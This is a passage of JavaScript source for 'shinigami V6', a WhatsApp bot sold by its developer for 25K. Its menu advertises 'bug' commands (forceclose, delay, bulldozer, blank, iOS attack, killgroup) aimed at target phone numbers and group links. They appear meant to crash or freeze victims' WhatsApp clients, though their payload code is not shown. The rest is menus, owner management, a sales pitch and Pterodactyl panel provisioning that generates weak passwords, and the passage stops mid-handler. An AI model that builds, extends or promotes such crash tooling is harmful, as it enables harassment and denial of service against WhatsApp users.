Hi \`${pushname}\` 👋 ${getGreeting(parseInt(nowJakarta.format('HH')))} I'm shinigami, your WhatsApp assistant. I'm here to help you with various tasks and make things easier for you. Just send what you need and I'll do my best to assist you. ✨
       
⌲ \`𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 𝐁𝐎𝐓\`
┏━━━━━━━━━━━━━━━━
┃✦ *Name Bot  » shinigami*
┃✦ *Owner » Wahyu*
┃✦ *Developer » Asepp*
┃✦ *Version  » V6*
┃✦ *Language » JavaScript*
┃✦ *RunTime   » ${runtime(process.uptime())}*
┃✦ *Bot Mode » ${Asepp.public ? "Public" : "Self"}*
┃✦ TypeScript : *JavaScript*
┃✦ *StatusScript  » buyVip/buyer*
┗━━━━━━━━━━━━━━━━━━

\`[洛] 𝐏𝐑𝐈𝐕𝐀𝐓𝐄 𝐁𝐔𝐆 [洛]\`

   \`[ 𝐅𝐎𝐑𝐂𝐋𝐎𝐒𝐄 𝐒𝐇𝐈𝐍𝐈𝐆𝐀𝐌𝐈 ]\`
→ .shinigami-fc 628xxx
→ .fc-invis 628xxx
→ .forclose-shinigami 628xxx

    \`[ 𝐃𝐄𝐋𝐀𝐘 𝐒𝐇𝐈𝐍𝐈𝐆𝐀𝐌𝐈 ]\`
→ .delay-god 628xxx
→ .delay-shinigami 628xxx
→ .delay-hard 628xxx
→ .delay-maker 628xxx

  \`[ 𝐃𝐄𝐋𝐀𝐘 𝐁𝐄𝐁𝐀𝐒 𝐒𝐏𝐀𝐌 ]\`
→ .vcxl 628xxx

   \`[ 𝐁𝐔𝐋𝐃𝐎𝐙𝐄𝐑 𝐒𝐇𝐈𝐍𝐈𝐆𝐀𝐌𝐈 ]\`
→ .shinigami-bulldozer 628xxx
→ .shinigami-attack 628xxx
→ .shinigami-bulldozerv2 628xxx

   \`[ 𝐔𝐈 𝐒𝐇𝐈𝐍𝐈𝐆𝐀𝐌𝐈 ]\`
→ .blank-one 628xxx
→ .blank-phone 628xxx
→ .blank-shinigami 628xxx
   
   \`[ 𝐈𝐎𝐒 𝐒𝐇𝐈𝐍𝐈𝐆𝐀𝐌𝐈 ]\`
→ .shinigami-ios 628xxx
→ .ios-attack 628xxx

\`[洛] 𝐁𝐔𝐆 𝐆𝐑𝐎𝐔𝐏 [洛]\`
→ .shinigami-killgroup *Link Group*
→ .shinigami-blankgroup *Link Group*

\`[洛] 𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔 [洛]\`
→ .addowner
→ .delowner
→ .addmurbug
→ .delmurbug
→ .self
→ .public
→ .restart

\`[洛] 𝐅𝐔𝐍 𝐌𝐄𝐍𝐔 [洛]\`
→ .shinigami ( Ai )
→ .promote
→ .demote
→ .open
→ .close
→ .kick
→ .ht
→ .tagall
→ .rvo
→ .addcase
→ .delcase
→ .cekkhodam
→ .cekganteng
→ .cekcantik
→ .cekkontol
→ .cekidgc
→ .cekidch
→ .stiker
→ .tiktok
→ .bocilwindah
→ .brat
→ .getcode
→ .tourl
→ .trackip
→ .quotesgalau
→ .quotesmotivasi
→ .quotesbacot
→ .quotesbucin
→ .kisahnabi
→ .qc
→ .swgrup

\`[洛] 𝐂𝐏𝐀𝐍𝐄𝐋 𝐌𝐄𝐍𝐔 [洛]\`
→ .1gb *username*
→ .2gb *username*
→ .3gb *username*
→ .4gb *username*
→ .5gb *username*
→ .6gb *username*
→ .7gb *username*
→ .8gb *username*
→ .9gb *username*
→ .10gb *username*
→ .unli *username*
→ .cadmin *username*
→ .delpanel
→ .deladmin
→ .listpanel
→ .listadmin
→ .addres
→ .delres

\`[洛] 𝐍𝐒𝐅𝐖 𝐌𝐄𝐍𝐔 [洛]\`
→ .18+
→ .asupan
→ .paptt
→ .nsfw
→ .hentaineko
→ .manga
→ .cum
→ .ero
→ .gangbang
→ .foot
→ .milf
→ .pussy
→ .yuri
→ .zettai
`

    const msg = generateWAMessageFromContent(
        m.chat,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: ""
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: teks
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            hasMediaAttachment: true,
                            videoMessage: (
                                await prepareWAMessageMedia(
                                    { video: { url: "https://qu.ax/fPcSi" } },
                                    { upload: Asepp.waUploadToServer }
                                )
                            ).videoMessage,
                            gifPlayback: true
                        }),
                        contextInfo: {
                            isForwarded: true,
                            forwardingScore: 999999,
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: '120363418538598013@newsletter',
                                newsletterName: '𝐈𝐤𝐢𝐀𝐬𝐞𝐩𝐋𝐨𝐡𝐉𝐢𝐫',
                                serverMessageId: 145
                            }
                        },
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            messageParamsJson: JSON.stringify({
                                limited_time_offer: {
                                    text: "𝐒𝐇𝐈𝐍𝐈𝐆𝐀𝐌𝐈 𝐕𝟔",
                                    url: "https://t.me/AsepXxnx",
                                    copy_code: "𝐕𝟔",
                                    expiration_time: Date.now() * 999
                                },
                                bottom_sheet: {
                                    in_thread_buttons_limit: 2,
                                    divider_indices: [1, 2, 3, 4, 5],
                                    list_title: "CLICK",
                                    button_title: "© V6"
                                }
                            }),
                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: JSON.stringify({
                                        title: "© V6",
                                        sections: [{
                                            title: "List Menu",
                                            highlight_label: "𝐓𝐨𝐩 𝐅𝐞𝐚𝐭𝐮𝐫𝐞 🚀",
                                            rows: [
                                                { title: "𝐁𝐮𝐠 𝐌𝐞𝐧𝐮", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝑩𝒖𝒈 𝑨𝒏𝒅 𝑪𝒓𝒂𝒔𝒉 𝑭𝒆𝒂𝒕𝒖𝒓𝒆𝒔", id: ".bugmenu" },
                                                { title: "𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝑶𝒘𝒏𝒆𝒓 𝑩𝒐𝒕 𝑪𝒐𝒏𝒕𝒓𝒐𝒍 𝑭𝒆𝒂𝒕𝒖𝒓𝒆𝒔", id: ".ownermenu" },
                                                { title: "𝐅𝐮𝐧 𝐌𝐞𝐧𝐮", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝑭𝒖𝒏 𝑨𝒏𝒅 𝑬𝒏𝒕𝒆𝒓𝒕𝒂𝒊𝒏𝒎𝒆𝒏𝒕 𝑭𝒆𝒂𝒕𝒖𝒓𝒆𝒔", id: ".funmenu" },
                                                { title: "𝐂𝐩𝐚𝐧𝐞𝐥 𝐌𝐞𝐧𝐮", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝑪𝒑𝒂𝒏𝒆𝒍 𝑴𝒂𝒏𝒂𝒈𝒆𝒎𝒆𝒏𝒕 𝑭𝒆𝒂𝒕𝒖𝒓𝒆𝒔", id: ".cpanelmenu" },
                                                { title: "𝐍𝐬𝐟𝐰 𝐌𝐞𝐧𝐮", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝟏𝟖+ 𝑭𝒆𝒂𝒕𝒖𝒓𝒆𝒔", id: ".nsfwmenu" },
                                                { title: "𝐓𝐡𝐚𝐧𝐤𝐬 𝐓𝐨", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝑻𝒉𝒆 𝑺𝒖𝒑𝒐𝒓𝒕 𝑳𝒊𝒔𝒕", id: ".tqto" },
                                                { title: "𝐒𝐜𝐫𝐢𝐩𝐭", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝑺𝒄𝒓𝒊𝒑𝒕 𝑷𝒓𝒊𝒄𝒆", id: ".script" },
                                                { title: "𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝑫𝒆𝒗𝒆𝒍𝒐𝒑𝒆𝒓 𝑪𝒐𝒏𝒕𝒂𝒄𝒕", id: ".owner" }
                                            ]
                                        }]
                                    })
                                }
                            ]
                        })
                    })
                }
            }
        },
        { quoted: lol }
    );

    await Asepp.relayMessage(m.chat, msg.message, { messageId: msg.key.id });

    await Asepp.sendMessage(
        m.chat,
        {
            audio: fs.readFileSync("./image/3021.mp3"),
            mimetype: "audio/mp4",
            ptt: false
        },
        { quoted: qkontak }
    );
}
break;

case "tqto": {
await Asepp.sendMessage(m.chat, { react: { text: "🩸", key: m.key } });
let teks = `〘 Thanks To Support 〙
𝐀𝐥𝐥𝐚𝐡 𝐒𝐰𝐭 𝐒𝐚𝐧𝐠 𝐏𝐞𝐧𝐜𝐢𝐩𝐭𝐚 𝐀𝐥𝐚𝐦 👑
Wahyu ϟ Owner
Asepp ϟ Developer
AsepX7  ϟ [ Mybro ]
Kelpin ϟ [ Mybro ]
Vike  ϟ [ Mybro ]
Ditchi  ϟ [ Mybro ]
Kartel  ϟ [ Mybro ]
Kazu  ϟ [ Idiot ]
Raza  ϟ [ Freind ]
`

    const msg = generateWAMessageFromContent(
        m.chat,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: ""
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: teks
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            hasMediaAttachment: true,
                            videoMessage: (
                                await prepareWAMessageMedia(
                                    { video: { url: "https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1778780730180.mp4" } },
                                    { upload: Asepp.waUploadToServer }
                                )
                            ).videoMessage,
                            gifPlayback: true
                        }),
                        contextInfo: {
                            isForwarded: true,
                            forwardingScore: 999999,
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: '120363418538598013@newsletter',
                                newsletterName: '𝐈𝐤𝐢𝐀𝐬𝐞𝐩𝐋𝐨𝐡𝐉𝐢𝐫',
                                serverMessageId: 145
                            }
                        },
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            messageParamsJson: JSON.stringify({
                                limited_time_offer: {
                                    text: "𝐒𝐇𝐈𝐍𝐈𝐆𝐀𝐌𝐈 𝐕𝟔",
                                    url: "https://t.me/AsepXxnx",
                                    copy_code: "𝐕𝟔",
                                    expiration_time: Date.now() * 999
                                },
                                bottom_sheet: {
                                    in_thread_buttons_limit: 2,
                                    divider_indices: [1, 2, 3, 4, 5],
                                    list_title: "CLICK",
                                    button_title: "© V6"
                                }
                            }),
                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: JSON.stringify({
                                        title: "© V6",
                                        sections: [{
                                            title: "List Menu",
                                            highlight_label: "𝐓𝐨𝐩 𝐅𝐞𝐚𝐭𝐮𝐫𝐞 🚀",
                                            rows: [
                                                { title: "𝐀𝐥𝐥 𝐌𝐞𝐧𝐮", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝑨𝒍 𝑨𝒗𝒂𝒊𝒍𝒂𝒃𝒍𝒆 𝑩𝒐𝒕 𝑪𝒐𝒎𝒂𝒏𝒅𝒔", id: ".allmenu" },
                                                { title: "𝐁𝐮𝐠 𝐌𝐞𝐧𝐮", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝑩𝒖𝒈 𝑨𝒏𝒅 𝑪𝒓𝒂𝒔𝒉 𝑭𝒆𝒂𝒕𝒖𝒓𝒆𝒔", id: ".bugmenu" },
                                                { title: "𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝑶𝒘𝒏𝒆𝒓 𝑩𝒐𝒕 𝑪𝒐𝒏𝒕𝒓𝒐𝒍 𝑭𝒆𝒂𝒕𝒖𝒓𝒆𝒔", id: ".ownermenu" },
                                                { title: "𝐅𝐮𝐧 𝐌𝐞𝐧𝐮", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝑭𝒖𝒏 𝑨𝒏𝒅 𝑬𝒏𝒕𝒆𝒓𝒕𝒂𝒊𝒏𝒎𝒆𝒏𝒕 𝑭𝒆𝒂𝒕𝒖𝒓𝒆𝒔", id: ".funmenu" },
                                                { title: "𝐂𝐩𝐚𝐧𝐞𝐥 𝐌𝐞𝐧𝐮", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝑪𝒑𝒂𝒏𝒆𝒍 𝑴𝒂𝒏𝒂𝒈𝒆𝒎𝒆𝒏𝒕 𝑭𝒆𝒂𝒕𝒖𝒓𝒆𝒔", id: ".cpanelmenu" },
                                                { title: "𝐍𝐬𝐟𝐰 𝐌𝐞𝐧𝐮", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝟏𝟖+ 𝑭𝒆𝒂𝒕𝒖𝒓𝒆𝒔", id: ".nsfwmenu" },
                                                { title: "𝐒𝐜𝐫𝐢𝐩𝐭", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝑺𝒄𝒓𝒊𝒑𝒕 𝑷𝒓𝒊𝒄𝒆", id: ".script" },
                                                { title: "𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫", description: "𝑫𝒊𝒔𝒑𝒍𝒂𝒚𝒔 𝑫𝒆𝒗𝒆𝒍𝒐𝒑𝒆𝒓 𝑪𝒐𝒏𝒕𝒂𝒄𝒕", id: ".owner" }
                                            ]
                                        }]
                                    })
                                }
                            ]
                        })
                    })
                }
            }
        },
        { quoted: lol }
    );

    await Asepp.relayMessage(m.chat, msg.message, { messageId: msg.key.id });

    await Asepp.sendMessage(
        m.chat,
        {
            audio: fs.readFileSync("./image/iqjir.mp3"),
            mimetype: "audio/mp4",
            ptt: false
        },
        { quoted: qkontak }
    );
}
break;
case "owner": {
await Asepp.sendMessage(m.chat, { react: { text: "🩸",key: m.key,}}); 
let imgsc = await prepareWAMessageMedia({ image: fs.readFileSync("./image/AsepIkiCok.jpg") }, { upload: Asepp.waUploadToServer })
const msgii = await generateWAMessageFromContent(m.chat, {
ephemeralMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: ``,
}), 
contextInfo: {}, 
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `\`[ 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗢𝘄𝗻𝗲𝗿 ]\`
Contact Asepp : 62881036109288
Telegram :t.me/AsepXxnx
TikTok : tiktok.com/@asepppxyz`, 
hasMediaAttachment: true,
...imgsc
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Whatsapp Asepp\",\"url\":\"https://wa.me/62881036109288\",\"merchant_url\":\"https://www.google.com\"}`
},
{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Telegram\",\"url\":\"https://t.me/AsepXxnx\",\"merchant_url\":\"https://www.google.com\"}`
},
{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Saluran Info\",\"url\":\"https://whatsapp.com/channel/0029VbAyjNu9mrGh7Djui02R\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"TikTok\",\"url\":\"\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Testimoni\",\"url\":\"https://whatsapp.com/channel/0029VbAyjNu9mrGh7Djui02R\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}]
})
})}
}}, {quoted: qkontak})
await Asepp.relayMessage(m.chat, msgii.message, {messageId: msgii.key.id})
}

break

case 'script':
case 'sc': {
await Asepp.sendMessage(m.chat, { react: { text: "🩸",key: m.key,}}); 
let teks = ` Hai Kak ${pushname} Tertarik Dengan Script shinigami? 
Kalo ingin membeli bisa langsung chat owner bot ya

Harga Script shinigami V6: 25K
Harga Reseller shinigami : 50K
Dll bisa langsung tanya tanya aja

Contact Real : wa.me/62881036109288
Telegram : https://t.me/AsepXxnx
TikTok : tiktok.com/@asepppxyz
`
 let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: "© shinigami V6"
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Whatsapp Asepp\",\"url\":\"https://wa.me/62881036109288\",\"merchant_url\":\"https://www.google.com\"}`
},
{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Telegram\",\"url\":\"https://t.me/AsepXxnx\",\"merchant_url\":\"https://www.google.com\"}`
},
{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Saluran Info\",\"url\":\"https://whatsapp.com/channel/0029VbAyjNu9mrGh7Djui02R\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"TikTok\",\"url\":\"\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Testimoni\",\"url\":\"https://whatsapp.com/channel/0029VbAyjNu9mrGh7Djui02R\",\"merchant_url\":\"https://www.google.com\"}`
}]
}) 
})} 
}}, {userJid: m.sender, quoted: lol}) 
await Asepp.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})	
}   
break
// Case Owner
case "addowner": {
  if (!isCreator) return payreply(mess.owner)

  const q = args.join(" ")
  if (!q) 
    return payreply(`_*Penggunaan ${prefix + command} nomor\nContoh ${prefix + command} 628xxxx_*`)

  let number = q.replace(/[^0-9]/g, '')
  let jid = number + "@s.whatsapp.net"

  let ceknya = await Asepp.onWhatsApp(jid)
  if (!ceknya || ceknya.length === 0)
    return payreply("*Masukkan nomor WhatsApp yang valid!*")

  if (ownerbot.includes(jid))
    return payreply("*Nomor tersebut sudah menjadi owner!*")

  ownerbot.push(jid)
  fs.writeFileSync(OWNER_PATH, JSON.stringify(ownerbot, null, 2))

  payreply(`*Nomor ${number} berhasil ditambahkan sebagai owner!*`)
}
break

case "delowner": {
  if (!isCreator) return payreply(mess.owner) 

  const q = args.join(" ")
  if (!q)
    return payreply(`_*Penggunaan ${prefix + command} nomor\nContoh ${prefix + command} 628xxxx_*`)

  let number = q.replace(/[^0-9]/g, '')
  let jid = number + "@s.whatsapp.net"

  if (!ownerbot.includes(jid))
    return payreply("*Nomor tersebut bukan owner!*")

  const index = ownerbot.indexOf(jid)
  ownerbot.splice(index, 1)

  fs.writeFileSync(OWNER_PATH, JSON.stringify(ownerbot, null, 2))

  payreply(`*Nomor ${number} berhasil dihapus dari owner!*`)
}
break

        case 'addmurbuggc':
if (!isCreator) return 
if (!isGroup) return payreply(mess.group) 
if (!isCreator) return payreply(mess.owner)
unli.push(m.chat)
fs.writeFileSync('./database/unli.json', JSON.stringify(unli))
payreply(`Seluruh member grup kini telah menjadi murbug`)
break
case "delmurbuggc":{

if (!isGroup) return payreply(mess.group)
if (!isCreator) return payreply(mess.owner)
unli.splice(m.chat)
fs.writeFileSync("./database/unli.json", JSON.stringify(unli))
payreply(`Seluruh member grup sudah tidak lagi menjadi murbug`)
}
break

        case "addmurbug": {
if (!isCreator) return payreply(mess.owner)
if (!args[0]) return payreply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx`)

let nomor = args[0].replace(/[^0-9]/g, '')
let jid = nomor + "@s.whatsapp.net"

let cek = await Asepp.onWhatsApp(jid)
if (!cek[0]?.exists) return payreply(`Nomor tidak terdaftar di WhatsApp!`)

let premium = JSON.parse(fs.readFileSync("./database/premium.json"))

if (premium.includes(jid)) 
return payreply(`Nomor ini sudah Murbug!`)

premium.push(jid)
fs.writeFileSync("./database/premium.json", JSON.stringify(premium, null, 2))

payreply(`✅ Nomor ${jid} berhasil jadi Murbug`)
}
break

case 'public': { 
if (!isCreator) return payreply(mess.owner);
if (Asepp.public === true) return payreply("Success To Public Mode");
Asepp.public = true
payreply("Success To Public Mode");
}
break

case 'self': {
if (!isCreator) return payreply(mess.owner);
if (Asepp.public === false) return payreply("Success To Self Mode");
Asepp.public = false
payreply("Success To Self Mode");
}
break


case "restart": case "rst": case "restartbot": {
  
  await payreply("Memproses _restart server_ . . .")
  var file = await fs.readdirSync("./session")
  var anu = await file.filter(i => i !== "creds.json")
  for (let t of anu) {
    await fs.unlinkSync(`./session/${t}`)
  }
  await payreply("Restarting bot...")
  process.exit(0)
}
break


// Cpanel Menu
case "listadmin": {
if (!isCreator) return payreply(mess.owner)
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return payreply("Tidak ada admin panel")
var teks = "\n *#- List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await Asepp.sendMessage(m.chat, {text: teks}, {quoted: m})
}
break

//================================================================================
case "listpanel": case "listp": case "listserver": {
if (!isCreator) return payreply(mess.owner)
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return payreply("Tidak Ada Server Bot")
let messageText = "\n *#- List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/Asepp/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}
await Asepp.sendMessage(m.chat, {text: messageText}, {quoted: m})
}
break

//================================================================================
case "deladmin": {
if (!isCreator) return payreply(mess.owner)
if (!text) return payreply(example("idnya"))
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return payreply("Akun admin panel tidak ditemukan!")
await payreply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break

//================================================================================
case "delpanel": {
if (!isCreator) return payreply(mess.owner)
if (!text) return payreply(example("idnya"))
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return payreply("Server panel tidak ditemukan!")
payreply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break

case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": case "unlimited": case "unli": {
if (!isCreator && !isReseller) return payreply(mess.owner)
if (!text) return payreply("username")
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await payreply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `
 *Detail Akun Panel:*  

- *ID Server:* ${server.id}  
- *Nama:* ${name}  
- *Username:* ${user.username}  
- *Password:* ${password}  
- *Login:* ${global.domain}  
- *RAM:* ${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}  
 *CPU:* ${cpu == "0" ? "Unlimited" : cpu+"%"}  
- *Disk:* ${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}  

`;
await Asepp.sendMessage(orang, {text: teks}, {quoted: m})
delete global.panel
}
break

case "cadmin": {
if (!isCreator) return payreply(mess.owner)
if (!text) return payreply("username")
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
